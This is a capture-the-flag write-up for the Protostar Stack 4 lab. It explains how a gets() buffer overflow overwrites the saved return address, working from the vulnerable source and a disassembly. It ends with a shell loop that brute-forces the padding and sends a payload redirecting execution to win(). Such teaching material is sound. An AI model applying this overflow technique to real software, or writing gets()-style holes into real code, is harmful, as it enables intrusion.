# Protostar - Stack 4

### About ###

>Stack4 takes a look at overwriting saved EIP and standard buffer overflows.
>
>This level is at `/opt/protostar/bin/stack4`
>
>**Hints**
>
> - A variety of introductory papers into buffer overflows may help.
> - gdb lets you do “run < input”
> - EIP is not directly after the end of buffer, compiler padding can also increase the size.


### Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

### Solution 

This is the first challenge where we need to actually rewrite the saved `eip` in order to gain control of the execution flow. 

When a function is called, the address of the instruction following the call is placed on the stack, this is the return address or saved `eip`.

```
 8048431:      	e8 2a ff ff ff         	call   8048360 <puts@plt>
 8048436:      	c9                     	leave
```

For instance, when the function `puts` is called in the snippet above, its return address will be `0x08048436`: the address of `leave`.


Back to our challenge. Initially, the stack frame of `main` will look like this:

`main` Stack Frame variables | `main` Stack Frame values
---:|:---
buffer[0:3] | `0x00000000`
buffer[4:7] | `0x00000000`
... | `0x00000000`
buffer[60:63] | `0x00000000`
padding[?] | `0x00000000`
Saved ebp | `0xbffff808`
Saved eip | `0xb7eadc76`

If we disassemble the function `main`, we can see the instruction `and    $0xfffffff0,%esp`. This instruction aligns the top of the stack to an address that is a multiple of sixteen.

```
08048408 <main>:
 8048408:      	55                     	push   %ebp
 8048409:      	89 e5                  	mov    %esp,%ebp
 804840b:      	83 e4 f0               	and    $0xfffffff0,%esp
 804840e:      	83 ec 50               	sub    $0x50,%esp
 8048411:      	8d 44 24 10            	lea    0x10(%esp),%eax
 8048415:      	89 04 24               	mov    %eax,(%esp)
 8048418:      	e8 ef fe ff ff         	call   804830c <gets@plt>
 804841d:      	c9                     	leave
 804841e:      	c3                     	ret
 804841f:      	90                     	nop
```

This means that there might be some padding between buffer and the saved `ebp`. We will have to keep that in mind during the exploitation.

In order to exploit this binary, we have to change the saved eip to the address of `win`.

```
080483f4 <win>:
 80483f4:      	55                     	push   %ebp
 80483f5:      	89 e5                  	mov    %esp,%ebp
 80483f7:      	83 ec 18               	sub    $0x18,%esp
 80483fa:      	c7 04 24 e0 84 04 08   	movl   $0x80484e0,(%esp)
 8048401:      	e8 26 ff ff ff         	call   804832c <puts@plt>
 8048406:      	c9                     	leave
 8048407:      	c3                     	ret
```

The method is the same than in the previous exercises. In order to overwrite the saved `eip` we will need to overwrite the values of `buffer`, the padding and the saved `ebp`. If `x` is the size of the padding between `buffer` and the saved `ebp`, the total of bytes to overwrite is `64 (buffer) + x (padding) + 4 (saved ebp)`, which is at least 68 bytes.

Since we have `0 <= x < 16`, we can simply try every possibility until we can execute `win`.

```
user@protostar:/tmp$ for i in $(seq 0 4 15); do echo "[+] Padding size = "$i; python -c "print 'A'*$((68+i))+'\xf4\x83\x04\x08'" | stack4; echo; done;
[+] Padding size = 0

[+] Padding size = 4
Segmentation fault

[+] Padding size = 8
code flow successfully changed
Segmentation fault

[+] Padding size = 12
Segmentation fault

```
